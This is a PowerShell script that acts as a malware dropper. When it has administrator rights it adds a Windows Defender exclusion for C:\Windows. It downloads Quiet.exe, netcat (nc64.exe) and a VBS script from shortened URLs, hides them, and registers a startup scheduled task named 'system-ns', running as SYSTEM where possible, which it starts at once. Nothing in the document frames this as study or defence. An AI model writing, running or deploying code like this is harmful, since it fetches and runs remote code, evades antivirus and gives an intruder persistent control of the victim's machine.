# Check if the script is running as an Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Output "Running as Administrator"

    # Admin rights detected
    $installPath = "C:\Windows"
    $scriptVbsUrl = "https://rb.gy/w3a7hb"

    # Windows Defender Exclusion
    Add-MpPreference -ExclusionPath $installPath
} else {
    Write-Output "Not running as Administrator"

    # No admin rights
    $installPath = Join-Path $env:USERPROFILE "System"
    $scriptVbsUrl = "https://rb.gy/3lld2p"
}

# Create the installation directory if it doesn't exist
if (-not (Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
}

# File download paths
$quietTxtPath = Join-Path $installPath "Quiet.exe"
$nc64TxtPath = Join-Path $installPath "nc64.exe"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# URLs for Quiet.exe and nc64.exe
$quietTxtUrl = "https://rb.gy/mx0i5"
$nc64TxtUrl = "https://rb.gy/guty9"

# Download files
Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath -UseBasicParsing
Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath -UseBasicParsing
Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath -UseBasicParsing

# Make all the downloaded files hidden
$filesToHide = @($quietTxtPath, $nc64TxtPath, $scriptVbsPath)
foreach ($file in $filesToHide) {
    attrib +H $file
}

# Create a scheduled task
$action = New-ScheduledTaskAction -Execute $scriptVbsPath
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd

try {
    $taskName = "system-ns"

    if ($isAdmin) {
        # If admin rights, run as NT AUTHORITY\SYSTEM
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

        # Register the task with SYSTEM account
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
    } else {
        # If not admin, create the task with the current user's context
        $principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive

        # Register the task without the -User parameter (Fix from the first script)
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
    }

    # Start the task immediately after registration
    Start-ScheduledTask -TaskName $taskName

} catch {
    Write-Output "Failed to register or start the scheduled task: $_"
}
